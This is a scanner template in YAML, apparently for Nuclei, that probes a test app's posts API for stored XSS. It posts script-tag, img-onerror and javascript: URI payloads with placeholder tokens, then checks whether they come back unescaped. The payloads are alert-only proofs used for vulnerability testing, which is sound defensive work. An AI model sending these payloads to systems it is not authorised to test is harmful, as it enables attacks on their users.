id: vuln-sns-posts-xss-stored

info:
  name: vuln-sns Posts Stored XSS
  author: devin
  severity: high
  description: Stored XSS vulnerability in post content field
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
  metadata:
    max-request: 4
  tags: xss,stored,posts,vuln-sns,authenticated

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/posts"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer alice_token"
    
    body: |
      {
        "content": "<script>alert('Stored XSS')</script>"
      }
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
      
      - type: word
        words:
          - "id"
          - "content"
        condition: and
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/api/posts"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer bob_token"
    
    body: |
      {
        "content": "<img src=x onerror=alert('XSS')>"
      }
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201

  - method: POST
    path:
      - "{{BaseURL}}/api/posts"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer alice_token"
    
    body: |
      {
        "content": "javascript:alert('XSS')"
      }
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201

  - method: GET
    path:
      - "{{BaseURL}}/api/posts"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert"
          - "onerror=alert"
          - "javascript:alert"
        condition: or
        part: body
      
      - type: status
        status:
          - 200
